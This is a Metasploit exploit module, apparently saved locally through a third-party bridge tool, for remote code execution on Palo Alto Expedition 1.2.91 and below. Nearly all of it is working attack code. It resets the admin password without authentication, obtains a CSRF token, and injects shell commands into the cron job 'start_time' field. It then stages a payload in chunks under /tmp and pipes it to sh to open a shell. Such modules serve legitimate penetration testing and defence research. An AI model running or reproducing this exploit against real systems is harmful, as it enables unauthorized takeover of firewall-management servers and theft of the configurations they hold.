##
# Metasploit Module — saved locally via SuiteXPL MSF Bridge
# Source: https://github.com/rapid7/metasploit-framework
# CVE: CVE-2024-5910 (admin reset), CVE-2024-9464 (RCE), CVE-2024-24809
# Bridge: embedxpl.core.bridges.exploit_bridge.run_via_msfconsole("paloalto_expedition_rce")
##

class MetasploitModule < Msf::Exploit::Remote
  class XsrfExceptionError < StandardError; end
  class XsrfExceptionUnreachableError < XsrfExceptionError; end

  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Palo Alto Expedition Remote Code Execution (CVE-2024-5910 and CVE-2024-9464)',
      'Description' => %q{
        Obtain remote code execution in Palo Alto Expedition version 1.2.91 and below.
        CVE-2024-5910 allows password reset of admin user.
        CVE-2024-9464 is an authenticated OS command injection.
        When no credentials provided, module resets admin password then injects commands.
      },
      'License' => MSF_LICENSE,
      'Author' => ['Michael Heinzl', 'Zach Hanley', 'Enrique Castillo', 'Brian Hysell'],
      'References' => [
        ['CVE', '2024-5910'], ['CVE', '2024-9464'], ['CVE', '2024-24809'],
        ['EDB', '52129'],
        ['URL', 'https://www.horizon3.ai/attack-research/palo-alto-expedition-from-n-day-to-full-compromise/'],
        ['URL', 'https://security.paloaltonetworks.com/PAN-SA-2024-0010'],
      ],
      'DisclosureDate' => '2024-10-09',
      'DefaultOptions' => {'RPORT' => 443, 'SSL' => true, 'FETCH_FILENAME' => Rex::Text.rand_text_alpha(1..3), 'FETCH_WRITABLE_DIR' => '/tmp'},
      'Payload' => {'BadChars' => "\x22\x3a\x3b\x5c"},
      'Targets' => [['Linux Command', {'Arch' => [ARCH_CMD], 'Platform' => %w[unix linux]}]],
      'DefaultTarget' => 0,
      'Notes' => {'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, ACCOUNT_LOCKOUTS]}
    ))
    register_options([
      OptString.new('USERNAME', [false, 'Username', 'admin']),
      OptString.new('PASSWORD', [false, 'Password', 'paloalto']),
      OptString.new('TARGETURI', [true, 'URI', '/']),
      OptBool.new('RESET_ADMIN_PASSWD', [true, 'Reset admin password if no creds', false]),
      OptString.new('WRITABLE_DIR', [false, 'Writable dir', '/tmp/']),
    ])
  end

  def xsrf_token_value
    user = @username || datastore['USERNAME']
    password = @password || datastore['PASSWORD']
    res = send_request_cgi('method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'bin/Auth.php'), 'keep_cookies' => true,
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {'action' => 'get', 'type' => 'login_users', 'user' => user, 'password' => password})
    raise XsrfExceptionUnreachableError, 'No reply' unless res
    data = res.get_json_document
    raise XsrfExceptionUnreachableError, "No token: #{data}" unless data['csrfToken']
    data['csrfToken']
  end

  def check
    unless datastore['USERNAME'] && datastore['PASSWORD']
      return CheckCode::Unknown('No creds; set RESET_ADMIN_PASSWD=true') unless datastore['RESET_ADMIN_PASSWD']
      res = send_request_cgi('method' => 'POST', 'uri' => normalize_uri(target_uri.path, 'OS/startup/restore/restoreAdmin.php'))
      return CheckCode::Unknown('No reply') unless res
      return CheckCode::Safe('Not vulnerable') if res.code == 403
      return CheckCode::Safe("Unexpected: #{res.body}") unless res.code == 200 && res.body.include?('Admin password restored to')
      @password = res.to_s.match(/'([^']+)'/)[1]
      @username = 'admin'; @reset = true
    end
    begin; @xsrf_token_value = xsrf_token_value
    rescue XsrfExceptionError; return CheckCode::Safe('Auth failed'); end
    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, 'bin/MTSettings/settings.php?param=versions'),
      'keep_cookies' => true, 'headers' => {'Csrftoken' => @xsrf_token_value})
    data = res.get_json_document; version = data.dig('msg', 'Expedition')
    return CheckCode::Unknown('No version') if version.nil?
    print_status("Version: #{version}")
    return CheckCode::Safe("#{version} not vulnerable") if Rex::Version.new(version) > Rex::Version.new('1.2.91')
    CheckCode::Appears("#{version} appears vulnerable")
  end

  def execute_command(cmd, check_res)
    name = Rex::Text.rand_text_alpha(4..8)
    res = send_request_cgi('method' => 'POST', 'uri' => normalize_uri(target_uri.path, 'bin/CronJobs.php'),
      'keep_cookies' => true, 'headers' => {'Csrftoken' => @xsrf_token_value},
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {'action' => 'set', 'type' => 'cron_jobs', 'project' => 'pandb', 'name' => name,
        'cron_id' => 1, 'recurrence' => 'Daily', 'start_time' => "\";#{cmd} #"})
    fail_with(Failure::UnexpectedReply, "HTTP #{res&.code}") if check_res && !res.nil? && res.code != 200
  end

  def exploit
    cmd = payload.encoded; chunk_size = rand(25..35)
    cmd_chunks = cmd.chars.each_slice(chunk_size).map(&:join)
    staging_file = (datastore['WRITABLE_DIR'] + '/' + Rex::Text.rand_text_alpha(3..5)).gsub('//', '/')
    unless @reset || (datastore['USERNAME'] && datastore['PASSWORD'])
      fail_with(Failure::BadConfig, 'No creds, set RESET_ADMIN_PASSWD=true') unless datastore['RESET_ADMIN_PASSWD']
      res = send_request_cgi('method' => 'POST', 'uri' => normalize_uri(target_uri.path, 'OS/startup/restore/restoreAdmin.php'))
      fail_with(Failure::Unreachable, 'No reply') unless res
      fail_with(Failure::UnexpectedReply, "#{res.body}") unless res.code == 200 && res.body.include?('Admin password restored to')
      @password = res.to_s.match(/'([^']+)'/)[1]; @username = 'admin'
    end
    begin; @xsrf_token_value = xsrf_token_value
    rescue XsrfExceptionError; fail_with(Failure::Unreachable, 'XSRF failed'); end
    print_status('Staging payload chunks...')
    redirector = '>'
    cmd_chunks.each_with_index do |chunk, i|
      execute_command("echo -n \"#{chunk}\" #{redirector} #{staging_file}", true); redirector = '>>'; sleep 1
    end
    print_good('Executing payload...')
    execute_command("cat #{staging_file} | sh && rm #{staging_file}", false); sleep 3
    print_status('Shell incoming!')
  end
end
